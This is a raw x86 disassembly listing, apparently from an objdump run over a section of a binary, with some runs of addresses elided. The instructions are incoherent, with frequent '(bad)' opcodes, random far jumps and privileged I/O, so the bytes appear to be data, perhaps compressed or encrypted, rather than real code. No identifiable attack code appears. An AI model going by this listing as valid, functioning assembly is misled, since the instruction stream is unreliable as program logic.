  41781a:	repnz repnz enter 0x773a,0x2d
  417820:	add    eax,0x93e4afec
  417825:	and    al,0xb0
  417827:	add    eax,0x1eff23ec
  41782c:	pop    eax
  41782d:	mov    dh,0x31
  41782f:	jo     0x417823
  417831:	xor    DWORD PTR [edx+eiz*1-0x42],esi
  417835:	cmp    eax,0xaaccd359
  41783a:	pop    es
  41783b:	cmc    
  41783c:	test   al,0xa2
  41783e:	call   0x2bf28722
  417843:	in     al,0x4
  417845:	add    eax,0xe0712b3f
  41784a:	mov    ebx,cs
  41784c:	int3   
  41784d:	ret    
  41784e:	lods   al,BYTE PTR ds:[esi]
  41784f:	mov    edi,0x2e887169
  417854:	mov    esp,0xa05cde38
  417859:	and    eax,0xcf5eb170
  41785e:	xchg   ebp,eax
  41785f:	sahf   
  417860:	sbb    eax,0xb6810606
  417865:	jp     0x41787d
  417867:	call   0x6c49:0x5dfae096
  41786e:	repnz or esi,DWORD PTR [edi+0x2981548b]
  417875:	mov    edx,0x5faefdc1
  41787a:	mov    al,0xe
  41787c:	aas    
  41787d:	jo     0x417899
  41787f:	test   edi,edi
  417881:	dec    edx
  417882:	xor    edx,esp
  417884:	mov    dh,0xa1
  417886:	into   
  417887:	call   0xf617:0xde81bf5a
  41788e:	add    eax,0xc9a7df7b
  417893:	shl    BYTE PTR [esp+ebp*1],1
  417896:	inc    eax
  417897:	add    al,ch
  417899:	daa    
  41789a:	push   0x9c4d953
  41789f:	xor    al,0xc6
  4178a1:	test   eax,0xcbdcae13
  4178a6:	das    
  4178a7:	sub    DWORD PTR [eax+0x431a7290],esi
  4178ad:	pop    edx
  4178ae:	or     al,0x16
  4178b0:	ret    0x6f14
  4178b3:	lds    esp,FWORD PTR [ebx+0xa3f69b5]
  4178b9:	test   eax,0xf60f1fd9
  4178be:	mov    eax,0x2b7a7f13
  4178c3:	mov    bl,0x9a
  4178c5:	add    al,0xf
  4178c8:	cmp    DWORD PTR [ebx-0x2c],esi
  4178cb:	mov    al,0xca
  4178cd:	jl     0x4178d8
  4178cf:	jge    0x41792e
  4178d1:	lock test bp,si
  4178d5:	xor    ah,BYTE PTR [ebp-0x43]
  4178d8:	cmp    DWORD PTR [edx-0x53997ba5],ebp
  4178de:	ss cmp al,0x4b
  4178e1:	js     0x41792b
  4178e3:	nop
  4178e4:	xor    al,BYTE PTR [edx]
  4178e6:	adc    BYTE PTR [esi],0x37
  4178e9:	dec    esp
  4178ea:	cmp    DWORD PTR [esi],esi
  4178ec:	call   0x26cf7630
  4178f1:	sbb    ebp,ebp
  4178f3:	mov    al,0xd5
  4178f5:	push   edi
  4178f6:	daa    
  4178f7:	(bad)  
  4178f8:	cmp    al,ah
  4178fa:	dec    ebp
  4178fb:	push   ebp
  4178fc:	fidiv  WORD PTR [ebx-0x66a1675]
  417902:	jmp    0xed10:0x97d44b1c
  417909:	pop    edi
  41790a:	cmp    BYTE PTR [esi-0xa],ah
  41790d:	lahf   
  41790e:	mov    eax,ebp
	...
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	mov    bh,0x5a
  417982:	pause  
  417984:	js     0x41797f
  417986:	add    BYTE PTR [eax],al
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	das    
  41798d:	cmp    edx,edi
  41798f:	mov    bh,0xdc
  417991:	and    eax,0xc5286651
  417996:	ds pop ebx
  417998:	sbb    edx,esi
  41799a:	test   al,0x71
  41799c:	mov    dh,BYTE PTR [edx]
  41799e:	mov    BYTE PTR [edi+0x31],bh
  4179a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179a2:	push   ebx
  4179a3:	dec    DWORD PTR [ebx-0x68764bdc]
  4179a9:	scas   eax,DWORD PTR es:[edi]
  4179aa:	in     al,dx
  4179ab:	and    dh,cl
  4179ad:	jecxz  0x4179ca
  4179af:	adc    al,0x6b
  4179b1:	sti    
  4179b2:	les    esp,FWORD PTR [eax]
  4179b4:	aad    0x28
  4179b6:	and    al,0x49
  4179b8:	fcomp  QWORD PTR [edi-0x2e074d8b]
  4179bf:	dec    edi
  4179c0:	and    al,0x77
  4179c2:	loopne 0x417965
  4179c4:	or     eax,0xba06fe42
  4179c9:	add    edi,DWORD PTR [esi]
  4179cb:	xchg   esp,eax
  4179cc:	adc    BYTE PTR [ebp+0x21],0x51
  4179d0:	or     esp,DWORD PTR [ecx+0x5cd0fc27]
  4179d6:	xchg   esp,eax
  4179d7:	repz push esi
  4179d9:	popf   
  4179da:	pop    ecx
  4179db:	pop    esi
  4179dc:	mov    al,ds:0xa589224a
  4179e1:	out    0x2d,al
  4179e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179e4:	xchg   ebx,eax
  4179e5:	stc    
  4179e6:	(bad)  
  4179e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179e9:	daa    
  4179ea:	sti    
  4179eb:	xlat   BYTE PTR ds:[ebx]
  4179ec:	dec    edi
  4179ed:	call   0xa84b:0x991b4329
  4179f4:	mov    ah,0x79
  4179f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f7:	outs   dx,DWORD PTR ds:[esi]
  4179f8:	adc    cl,ah
  4179fa:	imul   BYTE PTR [eax+0x6b3b271b]
  417a00:	lock pop esp
  417a02:	inc    eax
  417a03:	retf   0xe6c3
  417a06:	sbb    al,0x68
  417a08:	loopne 0x4179c7
  417a0a:	xor    ch,BYTE PTR [eax]
  417a0c:	xor    BYTE PTR [eax],0x82
  417a0f:	mov    ebp,0x90eb6912
  417a14:	jmp    0x7ce3:0x757df076
  417a1b:	jnp    0x417a40
  417a1d:	loopne 0x4179f6
  417a1f:	in     eax,dx
  417a20:	jbe    0x417a45
  417a22:	sbb    al,0xee
  417a24:	pop    es
  417a25:	mov    ebx,0x4fdc1912
  417a2a:	pop    esi
  417a2b:	ins    DWORD PTR es:[edi],dx
  417a2c:	icebp  
  417a2d:	loope  0x417a0c
  417a2f:	mov    ebx,0x65c7bee8
  417a34:	adc    al,dh
  417a36:	lahf   
  417a37:	jno    0x417a2b
  417a39:	fs pop eax
  417a3b:	fld    TBYTE PTR [edx]
  417a3d:	inc    eax
  417a3e:	push   cs
  417a3f:	les    edi,FWORD PTR [esi-0x70]
  417a42:	adc    esp,DWORD PTR [edi]
  417a44:	std    
  417a45:	in     eax,0x49
  417a47:	test   eax,0x52c2aade
  417a4c:	mov    ebx,0x8d17b3e3
  417a51:	loope  0x417a73
  417a53:	mov    ds:0x182ec6b5,al
  417a58:	or     al,0x14
  417a5a:	(bad)  
  417a5b:	sti    
  417a5c:	addr16 sbb al,0x11
  417a5f:	int3   
  417a60:	inc    ecx
  417a61:	(bad)  
  417a62:	sub    al,0xe6
  417a64:	in     eax,dx
  417a65:	cmovnp ebx,DWORD PTR [ecx-0x19]
  417a69:	dec    ebp
  417a6a:	and    eax,0x15036810
  417a6f:	mov    bh,0x98
  417a71:	addr16 add eax,0x4e6cacd6
  417a77:	loop   0x417a67
  417a79:	add    eax,0xd14bf3e5
  417a7e:	mov    ah,0x5
  417a80:	mov    cl,0xad
  417a82:	ror    DWORD PTR [esp+ebp*2+0x1b3e93c7],cl
  417a89:	mov    ds:0x23f17bb8,eax
  417a8e:	mov    cl,0xed
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x611e420]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	shl    bh,0xcd
  417b0f:	pop    edx
  417b10:	pop    ss
  417b11:	mov    al,0x7e
  417b13:	popa   
  417b14:	add    eax,DWORD PTR [esi+0x10a38693]
  417b1a:	mov    ebp,0xcef9bd8
  417b1f:	mov    edi,ecx
  417b21:	sub    DWORD PTR [esi],edx
  417b23:	je     0x417b45
  417b25:	sub    al,0xee
  417b27:	cmc    
  417b28:	dec    esi
  417b29:	and    al,0xd4
  417b2b:	or     BYTE PTR [edx+0x9],bl
  417b2e:	ret    0x4446
  417b31:	retf   
  417b32:	test   BYTE PTR [ecx+0x9],al
  417b35:	sub    DWORD PTR [eax],0x1722c18a
  417b3b:	ins    BYTE PTR es:[edi],dx
  417b3c:	and    edx,DWORD PTR [ebx+edx*1]
  417b3f:	dec    eax
  417b40:	imul   ecx,DWORD PTR [ebx+0x48e28ed0],0x63
  417b47:	pop    eax
  417b48:	pavgw  mm6,QWORD PTR [eax]
  417b4b:	dec    ecx
  417b4c:	mov    DWORD PTR [ebx+ebp*8+0x4b06f63b],esp
  417b53:	pushf  
  417b54:	xchg   edx,eax
  417b55:	mov    WORD PTR [esi-0x27],ss
  417b58:	fwait
  417b59:	push   eax
  417b5a:	push   0x4b
  417b5c:	adc    ecx,ebp
  417b5e:	loope  0x417b05
  417b60:	fcmove st,st(1)
  417b62:	mov    dh,0x19
  417b64:	add    DWORD PTR [edx-0x3bbeefdd],esp
  417b6a:	xchg   ebx,eax
  417b6b:	pop    ebx
  417b6c:	idiv   DWORD PTR [ecx-0x44]
  417b6f:	add    ebx,DWORD PTR [ebx-0x7e8f2270]
  417b75:	stc    
  417b76:	daa    
  417b77:	stc    
  417b78:	adc    BYTE PTR [esi],ah
  417b7a:	xor    edx,DWORD PTR [ecx-0x25f20f4a]
  417b80:	jecxz  0x417b1d
  417b82:	jmp    0x1ca6:0x82ae4a48
  417b89:	arpl   WORD PTR [eax],cx
  417b8b:	inc    ebp
  417b8c:	pop    ss
  417b8d:	repnz in eax,0x5e
  417b90:	sub    al,0xd7
  417b92:	loop   0x417bb9
  417b94:	xor    cl,bh
  417b96:	inc    edx
  417b97:	sar    DWORD PTR ds:0xf1d36e76,0x21
  417b9e:	ins    DWORD PTR es:[edi],dx
  417b9f:	cmp    dh,BYTE PTR [edi+0x9b4ea4e]
  417ba5:	inc    edx
  417ba6:	pop    ecx
  417ba7:	sbb    dl,ch
  417ba9:	(bad)  
  417baa:	mov    ch,0x2c
  417bac:	xchg   ecx,esp
  417bae:	cmp    al,0x86
  417bb0:	adc    eax,0xd6f249fd
  417bb5:	add    eax,DWORD PTR [esi]
  417bb7:	add    bl,BYTE PTR [esi]
  417bb9:	aad    0xe8
  417bbb:	add    eax,0x6cc2ba8e
  417bc0:	jge    0x417b70
  417bc2:	push   ebx
  417bc3:	add    bl,BYTE PTR [ecx-0x1c]
  417bc6:	ret    
  417bc7:	bnd ret 
  417bc9:	sub    dh,0xf3
  417bcc:	jbe    0x417c2d
  417bce:	(bad)
  417bd1:	lea    edx,[ebx+0x338987dd]
  417bd7:	cmp    al,0x66
  417bd9:	test   DWORD PTR [esi],edx
  417bdb:	fs pop sp
  417bde:	mov    eax,ds:0xd216095b
  417be3:	sti    
  417be4:	mov    ah,0xa1
  417be6:	jno    0x417bae
  417be8:	ins    BYTE PTR es:[edi],dx
  417be9:	js     0x417bf6
  417beb:	xchg   ecx,eax
  417bec:	add    ebx,DWORD PTR [ebp-0x21c50ecc]
  417bf2:	test   BYTE PTR [edi],cl
  417bf4:	(bad)
  417bf8:	inc    ecx
  417bf9:	loop   0x417bee
  417bfb:	push   ebx
  417bfc:	pop    edx
  417bfd:	rcl    DWORD PTR [ecx],0x57
  417c00:	lds    esp,FWORD PTR [edx]
  417c02:	jbe    0x417bda
  417c04:	dec    eax
  417c05:	mov    ds:0x4218982a,al
  417c0a:	push   es
  417c0b:	inc    esp
  417c0c:	mov    dh,0x7c
  417c0e:	iret   
  417c0f:	and    al,BYTE PTR [eax]
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xf0
  417c81:	pop    edx
  417c82:	mov    ah,0x97
  417c84:	cmp    bl,0x0
  417c87:	add    BYTE PTR [ecx+eax*1],al
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	jb     0x417c30
  417c8e:	loope  0x417c93
  417c90:	ja     0x417c75
  417c92:	sub    edx,esp
  417c94:	mov    edx,0x9a4a2903
  417c99:	or     BYTE PTR [esi+esi*2+0x613acf86],al
  417ca0:	aaa    
  417ca1:	sub    al,0xfb
  417ca3:	cdq    
  417ca4:	inc    esp
  417ca5:	sub    eax,0x85149bbf
  417caa:	nop
  417cab:	xor    BYTE PTR [ebx+ebx*2+0x7f8676af],bl
  417cb2:	gs ss dec ebp
  417cb5:	xchg   edx,eax
  417cb6:	fisubr DWORD PTR [eax+0x22ba96a2]
  417cbc:	(bad)  
  417cbe:	scas   al,BYTE PTR es:[edi]
  417cbf:	adc    esi,DWORD PTR [ebp-0x63f287ba]
  417cc5:	inc    eax
  417cc6:	xchg   edx,eax
  417cc7:	outs   dx,BYTE PTR ds:[esi]
  417cc8:	(bad)  
  417cc9:	cld    
  417cca:	pushf  
  417ccb:	adc    ch,cl
  417ccd:	inc    ebp
  417cce:	jmp    0x417d0e
  417cd0:	xchg   ebp,eax
  417cd1:	fnsave [ecx-0x78fc525a]
  417cd7:	adc    DWORD PTR [ebp+edx*4-0x5387647],esi
  417cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cdf:	ins    BYTE PTR es:[edi],dx
  417ce0:	call   0x6c1e9874
  417ce5:	sahf   
  417ce6:	cmc    
  417ce7:	shl    DWORD PTR fs:[ebx+0x170011c6],0x20
  417cef:	inc    ebx
  417cf0:	popf   
  417cf1:	xchg   ebx,eax
  417cf2:	in     eax,0x2a
  417cf4:	shl    BYTE PTR [ecx+0x8],1
  417cf7:	mov    ds:0x616acd35,al
  417cfc:	push   0x18
  417cfe:	or     eax,0xf0985e88
  417d03:	adc    eax,0x88fb82a1
  417d08:	call   0xf13961b7
  417d0d:	sub    eax,0x4146f04c
  417d12:	jmp    0x7d56be81
  417d17:	cmp    ah,bl
  417d19:	hlt    
  417d1a:	test   eax,0xd4a04354
  417d1f:	add    DWORD PTR [ebx],ecx
  417d21:	xlat   BYTE PTR ds:[ebx]
  417d22:	or     BYTE PTR [ecx-0x4f84bd52],ch
  417d28:	stos   BYTE PTR es:[edi],al
  417d29:	jl     0x417da7
  417d2b:	test   eax,0x86846208
  417d30:	mov    ds:0x38832a36,al
  417d35:	hlt    
  417d36:	sbb    BYTE PTR [edx+0x25082fb0],0xf0
  417d3d:	add    BYTE PTR [eax-0x612ca322],bl
  417d43:	or     al,0x53
  417d45:	inc    DWORD PTR gs:[eax]
  417d48:	sbb    DWORD PTR [edx+eax*4+0x53],esp
  417d4c:	inc    edi
  417d4d:	push   0x1f929b75
  417d52:	xchg   bl,dl
  417d54:	xchg   edi,eax
  417d55:	loope  0x417d12
  417d57:	je     0x417da8
  417d59:	leave  
  417d5a:	push   0x28
  417d5c:	je     0x417d3c
  417d5e:	inc    edx
  417d5f:	clc    
  417d60:	xor    BYTE PTR [ebp+0x793ab6a4],bl
  417d66:	sbb    DWORD PTR [ebp+0x9],0xffffffd2
  417d6a:	mov    eax,0x26fedeec
  417d6f:	(bad)  
  417d70:	cmc    
  417d71:	in     eax,0xaa
  417d73:	push   esp
  417d74:	rol    BYTE PTR [edi],1
  417d76:	shl    BYTE PTR [ebp-0x448f40d1],1
  417d7c:	add    edx,DWORD PTR [esi]
  417d7e:	mov    cl,0xbc
  417d80:	add    DWORD PTR [ebx-0x5e],edx
  417d83:	call   0x1ff0274e
  417d88:	frstor [eax-0x37f0fc74]
  417d8e:	or     ah,BYTE PTR [edi+0x0]
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	jmp    0xfc:0x84cf1451
  417e07:	add    BYTE PTR [ecx+eax*1],al
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	xchg   ebp,eax
  417e0d:	xlat   BYTE PTR ds:[ebx]
  417e0e:	cmp    eax,0x96e72790
  417e13:	mov    ebx,0x94a4fdd2
  417e18:	mov    edx,DWORD PTR [ebp-0x3f09031]
  417e1e:	adc    DWORD PTR [esi],0x1d969c3c
  417e24:	jle    0x417e0a
  417e26:	int3   
  417e27:	stos   BYTE PTR es:[edi],al
  417e28:	scas   al,BYTE PTR es:[edi]
  417e29:	inc    ecx
  417e2a:	xor    bl,BYTE PTR [ebx]
  417e2c:	dec    edx
  417e2d:	fcmovnb st,st(3)
  417e2f:	push   ds
  417e30:	mov    BYTE PTR [ebx+0x9aca24e],0xfc
  417e37:	mov    ah,0x98
  417e39:	sub    eax,0x804d1603
  417e3e:	inc    edi
  417e3f:	mov    dh,0x9b
  417e41:	out    dx,al
  417e42:	aas    
  417e43:	and    edx,esp
  417e45:	adc    dh,bl
  417e47:	add    ah,BYTE PTR [ecx-0x51]
  417e4a:	or     esi,esp
  417e4c:	mov    edi,edi
  417e4e:	out    0x3e,al
  417e50:	shl    DWORD PTR ds:0x8233c41,cl
  417e56:	mov    ecx,DWORD PTR [ecx+eax*2]
  417e59:	xchg   ebp,eax
  417e5a:	or     ecx,0xd
  417e5d:	add    DWORD PTR [edx],0x41
  417e60:	enter  0x4ea6,0xd3
  417e64:	jp     0x417df5
  417e66:	fdivr  DWORD PTR [eax-0x55]
  417e69:	(bad)  
  417e6b:	outs   dx,BYTE PTR ds:[esi]
  417e6c:	pop    ebx
  417e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e6e:	test   BYTE PTR [eax+0x5b],ah
  417e71:	call   0x78c2:0x905ae939
  417e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e79:	push   ss
  417e7a:	stc    
  417e7b:	xchg   ebp,eax
  417e7c:	hlt    
  417e7d:	adc    BYTE PTR gs:[bx+di-0x6066],dl
  417e83:	and    DWORD PTR [ecx-0x52],ebp
  417e86:	mov    bl,0xe0
  417e88:	jbe    0x417ed4
  417e8a:	jnp    0x417f04
  417e8c:	inc    ebx
  417e8d:	fistp  WORD PTR [esp+edx*4]
  417e90:	out    dx,al
  417e91:	out    dx,eax
  417e92:	das    
  417e93:	fs mov bl,0xdf
  417e96:	jg     0x417ed4
  417e98:	fs adc al,0x28
  417e9b:	iret   
  417e9c:	or     esi,esi
  417e9e:	adc    eax,0x4e686fc8
  417ea3:	repnz data16 sahf 
  417ea6:	sbb    eax,0x7a9d7bce
  417eab:	fiadd  WORD PTR [ecx+0x38]
  417eae:	rcr    BYTE PTR [edi+0x43],1
  417eb1:	and    eax,0xb6acae7a
  417eb6:	jbe    0x417e8a
  417eb8:	and    eax,0x9f2821f3
  417ebd:	pop    esp
  417ebe:	sub    al,0x45
  417ec0:	mov    ebp,0xde971ed4
  417ec5:	add    edx,0xffffffde
  417ec8:	out    0xa4,al
  417eca:	loop   0x417eb7
  417ecc:	and    eax,edi
  417ece:	add    ecx,DWORD PTR [eax]
  417ed0:	sub    al,bl
  417ed2:	jmp    0xfe15:0xa9c78c76
  417ed9:	and    BYTE PTR [eax+0x7d],bh
  417edc:	test   eax,0x3cd05c5
  417ee1:	mov    edx,0x8ef1d4d6
  417ee6:	push   ecx
  417ee7:	inc    ecx
  417ee8:	iret   
  417ee9:	neg    DWORD PTR [ecx-0x2c]
  417eec:	sub    dh,bh
  417eee:	jge    0x417ec7
  417ef0:	sbb    al,0x55
  417ef2:	int    0x4a
  417ef4:	push   edx
  417ef5:	mov    dl,0xda
  417ef7:	nop
  417ef8:	push   ecx
  417ef9:	pop    ebx
  417efa:	lahf   
  417efb:	inc    esi
  417efc:	(bad)  
  417efd:	daa    
  417efe:	mov    esi,0x12324149
  417f03:	addr16 mov eax,ds:0xbf2
  417f07:	jge    0x417f7a
  417f09:	daa    
  417f0a:	jmp    0xe2:0x3336e45d
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	fidivr DWORD PTR [edi]
  417f82:	call   0x13f0816
  417f87:	add    BYTE PTR [ecx+eax*1],al
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	jne    0x417f69
  417f8e:	sub    BYTE PTR [eax],ah
  417f90:	xor    dl,bl
  417f92:	sub    al,cl
  417f94:	jne    0x417f2e
  417f96:	popf   
  417f97:	mov    ah,0xe1
  417f99:	sub    eax,0x80f4b010
  417f9e:	mov    cl,0xcb
  417fa0:	scas   al,BYTE PTR es:[edi]
  417fa1:	pop    ds
  417fa2:	sbb    eax,0x1e5033b9
  417fa7:	mov    ecx,0x7029ba23
  417fac:	add    BYTE PTR ds:0x9e34263d,ah
  417fb2:	lahf   
  417fb3:	jge    0x417fb2
  417fb5:	mov    esp,0x5ac0fa07
  417fba:	das    
  417fbb:	cwde   
  417fbc:	xor    BYTE PTR [edi],0x2f
  417fbf:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fc1:	jle    0x417f4c
  417fc3:	and    edx,ebp
  417fc5:	xor    DWORD PTR [esi],0x27
  417fc8:	cmp    DWORD PTR [ebp-0x333e461a],eax
  417fce:	dec    eax
  417fcf:	and    al,0xf0
  417fd1:	push   0x37e4bba3
  417fd6:	je     0x418057
  417fd8:	mov    dl,0xce
  417fda:	lea    ebx,ds:0x9c227dd3
  417fe0:	jp     0x418017
  417fe2:	add    eax,0xd6fffc31
  417fe7:	mov    edi,0x942d72c2
  417fec:	pop    edi
  417fed:	shl    DWORD PTR [esi-0x50ce2d73],cl
  417ff3:	jo     0x417fe2
  417ff5:	pop    ebx
  417ff6:	or     eax,0x5c2c5e76
  417ffb:	(bad)  
  417ffc:	and    BYTE PTR [edx*4-0x4943ac6c],cl
  418003:	ja     0x41803e
  418005:	sbb    DWORD PTR [edi],ebx
  418007:	mov    eax,0x7415ff67
  41800c:	sbb    eax,0xed031876
  418011:	xor    cl,cl
  418013:	xor    al,0x35
  418015:	out    0x49,eax
  418017:	pop    ds
  418018:	test   BYTE PTR [esi],ah
  41801a:	pop    esi
  41801b:	mov    al,0xcb
  41801d:	and    eax,0x23d62265
  418022:	push   ecx
  418023:	mov    BYTE PTR [esi-0x7d7a4add],al
  418029:	mov    esi,0x2dc9b5f8
  41802e:	sbb    eax,0xf69e5d03
  418033:	sbb    ecx,0x73
  418036:	or     al,0x13
  418038:	and    eax,0x99259127
  41803d:	es jg  0x41805f
  418040:	std    
  418041:	(bad)  
  418042:	and    edx,DWORD PTR [edx+0x38]
  418045:	cld    
  418046:	leave  
  418047:	mov    ch,0x71
  418049:	adc    DWORD PTR [esi+0x7c05b3be],esp
  41804f:	mov    ah,0xd0
  418051:	pop    edi
  418052:	inc    esi
  418053:	inc    eax
  418054:	pop    ebx
  418056:	mov    WORD PTR [edx+ebx*4+0x1c],gs
  41805a:	popa   
  41805b:	xor    eax,0x92928d3c
  418060:	sub    BYTE PTR [ebx+0x2e8db42f],ah
  418066:	xchg   ecx,ebx
  418068:	mov    ch,0x39
  41806a:	fcmovbe st,st(7)
  41806c:	add    BYTE PTR [ebp+0x6d],dh
  41806f:	aam    0x1c
  418071:	or     DWORD PTR [edi],eax
  418073:	cmp    bl,BYTE PTR ds:0x74fcfbc9
  418079:	fld    TBYTE PTR [ecx]
  41807b:	dec    edx
  41807c:	mov    eax,0x551ee
  418081:	gs jmp 0x8375:0xe388901e
  418089:	cmp    DWORD PTR [esi],0xa6123b22
  41808f:	push   ecx
	...
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x8a2fdebc,eax
  418101:	(bad)  
  418102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418103:	xchg   esp,eax
  418104:	mov    esi,?
  418106:	add    BYTE PTR [eax],al
  418108:	add    al,0x1
  41810a:	add    BYTE PTR [eax],al
  41810c:	xor    BYTE PTR [ebp+0x3],bh
  41810f:	sub    al,0x4
  418111:	dec    ebx
  418112:	mov    cl,0x4d
  418114:	adc    BYTE PTR [edi+0x24296bc9],bh
  41811a:	inc    edx
  41811b:	ret    
  41811c:	sub    al,0x2a
  41811e:	xchg   BYTE PTR [ebx+0x66],dh
  418121:	mov    edx,0xd0b151b6
  418126:	fs push es
  418128:	push   edi
  418129:	adc    DWORD PTR [ebx+0x71],esp
  41812c:	push   edi
  41812d:	or     ah,BYTE PTR [esp+ebx*2+0x59c758a8]
  418134:	adc    DWORD PTR [edi],edx
  418136:	out    0x30,al
  418138:	lea    ecx,[edi-0xc]
  41813b:	fidivr WORD PTR [ecx+0x304d20f4]
  418141:	jbe    0x418159
  418143:	push   ds
  418144:	cmc    
  418145:	leave  
  418146:	push   edx
  418147:	stos   BYTE PTR es:[edi],al
  418148:	jmp    0x418188
  41814a:	inc    esi
  41814b:	mov    DWORD PTR [edx],esp
  41814d:	sbb    DWORD PTR [ebx+0x58f7ea50],eax
  418153:	pop    es
  418154:	mov    eax,DWORD PTR [edx+0x33412882]
  41815a:	pop    ds
  41815b:	arpl   WORD PTR [eax+0x6d2627da],di
  418161:	bnd jmp 0xc658fdf5
  418167:	jo     0x418140
  418169:	adc    DWORD PTR [esi-0x1c],ebx
  41816c:	popf   
  41816d:	out    0xe1,eax
  41816f:	push   0xdcc0cbfe
  418174:	jne    0x4181ab
  418176:	mov    al,ds:0xaa23510f
  41817b:	mov    ecx,0x73f23cfe
  418180:	cld    
  418181:	mov    ds:0xcbcdc61f,eax
  418186:	scas   al,BYTE PTR es:[edi]
  418187:	xchg   esp,eax
  418188:	sbb    eax,0x64ab7e20
  41818d:	fld    DWORD PTR [esi-0x2df915bd]
  418193:	jg     0x418211
  418195:	retf   
  418196:	xchg   DWORD PTR [ebx+0x56],edx
  418199:	ins    DWORD PTR es:[edi],dx
  41819a:	dec    esp
  41819b:	push   ss
  41819c:	xchg   DWORD PTR [esp+esi*2-0x5c],esp
  4181a0:	loopne 0x4181fc
  4181a2:	mov    ds,WORD PTR [esi+edi*4-0x4361523b]
  4181a9:	les    ecx,FWORD PTR [eax]
  4181ab:	outs   dx,DWORD PTR ds:[esi]
  4181ac:	jbe    0x41816b
  4181ae:	into   
  4181af:	retf   0x3ffa
  4181b2:	(bad)  
  4181b3:	addr16 pushf 
  4181b5:	mov    ds:0xd66eadd0,eax
  4181ba:	loopne 0x41815a
  4181bc:	clc    
  4181bd:	or     DWORD PTR ds:0xb7e4f646,eax
  4181c3:	je     0x418153
  4181c5:	lods   eax,DWORD PTR ds:[esi]
  4181c7:	scas   al,BYTE PTR es:[edi]
  4181c8:	mov    edi,0x25ccae0d
  4181cd:	xchg   ebp,eax
  4181ce:	mov    eax,edx
  4181d0:	loope  0x418162
  4181d2:	clc    
  4181d3:	shl    DWORD PTR [esi-0x301afc24],cl
  4181d9:	mov    ch,0x91
  4181db:	(bad)  
  4181dc:	or     al,0x85
  4181de:	jmp    0x6e31ea6e
  4181e3:	add    ch,cl
  4181e5:	cs inc edi
  4181e7:	cmp    DWORD PTR [eax],ecx
  4181e9:	addr16 mov cl,0xf6
  4181ec:	mov    ds:0x6467ef18,eax
  4181f1:	push   esp
  4181f2:	dec    eax
  4181f3:	lahf   
  4181f4:	push   edi
  4181f5:	ds push edi
  4181f7:	ret    0x4bf9
  4181fa:	retf   0x22e4
  4181fd:	dec    ebp
  4181fe:	jge    0x4181e8
  418200:	test   BYTE PTR [esp+edi*8+0x5f],cl
  418204:	push   eax
  418205:	xor    eax,0x601578e0
  41820a:	(bad)  
  41820c:	test   BYTE PTR [ebx],dh
  41820e:	cmp    BYTE PTR [edi+0x0],ah
	...
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x40d0b8d6
  418282:	popf   
  418283:	jnp    0x418215
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	sub    eax,0xe7fc7429
  418291:	pop    ecx
  418292:	daa    
  418293:	cmc    
  418294:	pop    ecx
  418295:	shl    BYTE PTR [ebx+edi*4],1
  418298:	push   DWORD PTR [ebx-0x47]
  41829b:	or     DWORD PTR gs:[edx-0x3c],edx
  41829f:	jecxz  0x4182bb
  4182a1:	sbb    edx,DWORD PTR [ebp-0x3cbd31d7]
  4182a7:	mov    ebx,0xcf23377
  4182ac:	mov    ds:0x4617dc5e,eax
  4182b1:	pop    edi
  4182b2:	int    0x70
  4182b4:	push   ds
  4182b5:	ret    
  4182b6:	inc    edi
  4182b7:	xchg   ebx,eax
  4182b8:	addr16 mov edx,0x7ede2936
  4182be:	das    
  4182bf:	mov    ds:0x95a0478f,eax
  4182c4:	or     BYTE PTR [esi+edi*8+0xbdf8301],0x7f
  4182cc:	mov    bl,0x95
  4182ce:	shl    BYTE PTR [ecx-0x66],cl
  4182d1:	pop    ebp
  4182d2:	dec    edx
  4182d3:	(bad)  
  4182d4:	push   eax
  4182d5:	das    
  4182d6:	rcl    DWORD PTR [ebp-0x4c3fa8ad],0x85
  4182dd:	or     al,0xde
